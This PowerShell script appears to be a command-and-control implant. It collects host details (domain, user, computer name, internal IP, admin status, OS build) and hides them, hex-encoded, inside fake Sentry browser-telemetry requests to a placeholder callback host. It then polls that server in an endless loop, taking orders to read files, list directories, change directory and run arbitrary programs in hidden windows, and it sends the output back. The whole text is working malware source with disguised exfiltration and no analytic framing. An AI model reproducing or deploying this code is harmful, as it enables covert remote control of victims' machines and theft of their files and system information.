$randomId = [int32](Get-Random -Maximum ([int32]::MaxValue + 1))

$agentId = [int32](Get-Random -Maximum ([int32]::MaxValue + 1))
$agentType = 0xab0ba000
$bytesAgentId = [BitConverter]::GetBytes($agentId)
$bytesAgentType = [BitConverter]::GetBytes($agentType)
$beat = $bytesAgentType + $bytesAgentId

$hexStringBeat = [System.BitConverter]::ToString($beat) -replace '-'

$uri = "http://<CALLBACK_HOST>:<CALLBACK_PORT>/api/" + $randomId + "/envelope"

$identity = [Security.Principal.WindowsIdentity]::GetCurrent()
$principal = New-Object Security.Principal.WindowsPrincipal($identity)
$elevated = $principal.IsInRole(
    [Security.Principal.WindowsBuiltInRole]::Administrator
)

$isServer = $OS.ProductType -ne 1

$gmtOffset = [TimeZoneInfo]::Local.GetUtcOffset(
    [DateTime]::Now
).TotalMinutes

$flag = 0
$flag = ($flag -shl 1) -bor ([int]$IsServer)
$flag = ($flag -shl 1) -bor ([int]$elevated)
$flag = ($flag -shl 1) -bor ([int][Environment]::Is64BitOperatingSystem)
$flag = ($flag -shl 1) -bor ([int][Environment]::Is64BitProcess)

$initialData = @{
    domain          = [System.Net.NetworkInformation.IPGlobalProperties]::GetIPGlobalProperties().DomainName
    username        = "$env:USERDOMAIN\$env:USERNAME"
    computer        = $env:COMPUTERNAME
    internal_ip     = (Test-Connection -ComputerName $env:COMPUTERNAME -Count 1).IPV4Address.IPAddressToString
    pid             = $pid
    tid             = [System.AppDomain]::GetCurrentThreadId()
    flag            = $flag
    build_number    = [Environment]::OSVersion.Version.Build
    major_version   = [Environment]::OSVersion.Version.Major
    minor_version   = [Environment]::OSVersion.Version.Minor
    process_name    = (Get-Process -Id $PID).ProcessName
    gmt_offset      = $gmtOffset
    acp             = [System.Globalization.CultureInfo]::CurrentCulture.TextInfo.ANSICodePage
    oemcp           = [System.Globalization.CultureInfo]::CurrentCulture.TextInfo.OEMCodePage
} | convertto-json

$global:isInitial = $true

function SendData($result) {
    # Send data to server using hex encoding and receive answer from server
    $hexStringData = ""
    if ($result.Count -ne 0) {
        $encoded = convertto-json -Depth 4 $result
        $bytes = [System.Text.Encoding]::UTF8.GetBytes($encoded)
        $hexStringData = [System.BitConverter]::ToString($bytes) -replace '-'
    }
    $additionalBeat = ""
    if ($global:isInitial) {
        $additionalBeat = [System.BitConverter]::ToString([System.Text.Encoding]::UTF8.GetBytes($initialData)) -replace '-'
        $global:isInitial = $false
    }

    $body = '{"event_id":"' + $hexStringBeat + $additionalBeat + '","sent_at":"2025-01-01T00:00:00.000Z","sdk":{"name":"sentry.javascript.browser","version":"7.0.0"}}
{"type":"transaction"}
{"contexts":{"trace":{"trace_id":"trace123456789abc","span_id":"span123456789abc","op":"pageload"}},"spans":[{"span_id":"span987654321def","op":"http.client","description":"' + $hexStringData + '","start_timestamp":1704067200.000,"timestamp":1704067200.100,"trace_id":"trace123456789abc"}],"start_timestamp":1704067200.000,"timestamp":1704067201.000,"transaction":"/home","type":"transaction","platform":"javascript"}
'

    $response = Invoke-WebRequest -Uri $uri -Method POST -Body $Body -UseBasicParsing

    $encodedTaskData = ($response.Content | convertfrom-json).id
    if ($encodedTaskData -eq "") {
        return New-Object System.Collections.ArrayList
    }

    $offset = 0

    $hexBytes = for ($i = 0; $i -lt $encodedTaskData.Length; $i += 2) {
        [Convert]::ToByte($encodedTaskData.Substring($i, 2), 16)
    }

    $res1 = [BitConverter]::ToUint32($hexBytes, $offset)
    $offset += 4

    $cmd = [BitConverter]::ToUint32($hexBytes, $offset)
    $offset += 4

    $arg = [System.Collections.ArrayList]::new()

    while ($offset -lt $hexBytes.Length - 4) {

        $argLen = [BitConverter]::ToUint32($hexBytes, $offset)
        $offset += 4

        $argString = [Text.Encoding]::ASCII.GetString(
            $hexBytes,
            $offset,
            $argLen - 1 # Skip the NULL terminator
        )

        [void]$arg.Add($argString)
        $offset += $argLen

    }

    $tid = [BitConverter]::ToUint32($hexBytes, $offset)

    return [PSCustomObject]@{
        Reserved1   = $res1
        Reserved2   = $res2
        TaskId      = $tid
        Command     = $cmd
        Arguments   = $arg
    }
}


$TaskResults = New-Object System.Collections.ArrayList
$TaskResults.Clear()
while ($true) {
    $TaskData = SendData($TaskResults)
    $TaskResults.Clear()

    $taskId = $TaskData.TaskId

    if ($TaskData.Command -eq 24) { #Cat
        $path = $TaskData.Arguments[0]

        try {
            $result = [System.IO.File]::ReadAllBytes($path)
        } catch {
            $result = $null
        }
        
        $responseData = @{
            command = $TaskData.Command
            path = $path
            content = $result
            taskId = $taskId
        }
        $TaskResults.Add($responseData)
    }
    elseif ($TaskData.Command -eq 8) {          # Cd
        $path = $TaskData.Arguments[0]
        Set-Location -Path $path -ErrorAction Stop
        [Environment]::CurrentDirectory = (Get-Location -PSProvider FileSystem).ProviderPath # For .NET
        $currentLocation = Get-Location
        $responseData = @{
            command = $TaskData.Command
            path = $path
            new_path = $currentLocation.Path
            taskId = $taskId
        }
        $TaskResults.Add($responseData)
    } elseif ($TaskData.Command -eq 14) {       # Ls
        $path = $TaskData.Arguments[0]
        $items = Get-ChildItem -Path $path -ErrorAction Stop
        $fileList = @()
        foreach ($item in $items) {
            $fileList += [PSCustomObject]@{
                Name = $item.Name
                FullName = $item.FullName
                IsDirectory = $item.PSIsContainer
                Length = if ($item.PSIsContainer) { $null } else { $item.Length }
                LastWriteTime = $item.LastWriteTime
            }
        }
        $responseData = @{
            command = $TaskData.Command
            path = $path
            files = $fileList
            taskId = $taskId
        }
        $TaskResults.Add($responseData)
    } elseif ($TaskData.Command -eq 6) {        # Run
        $executable = $TaskData.Arguments[0]
        $args = if ($TaskData.Arguments[1]) { $TaskData.Arguments[1] } else { "" }
        
        $processInfo = New-Object System.Diagnostics.ProcessStartInfo
        $processInfo.FileName = $executable
        $processInfo.Arguments = $args
        $processInfo.RedirectStandardOutput = $true
        $processInfo.RedirectStandardError = $true
        $processInfo.UseShellExecute = $false
        $processInfo.CreateNoWindow = $true
        
        $process = New-Object System.Diagnostics.Process
        $process.StartInfo = $processInfo
        $process.Start() | Out-Null
        
        $stdout = $process.StandardOutput.ReadToEnd()
        $stderr = $process.StandardError.ReadToEnd()
        $process.WaitForExit()
        
        $responseData = @{
            command = $TaskData.Command
            executable = $executable
            args = $args
            stdout = $stdout
            stderr = $stderr
            exitCode = $process.ExitCode
            taskId = $taskId
        }
        $TaskResults.Add($responseData)
    }

    Start-Sleep 10
}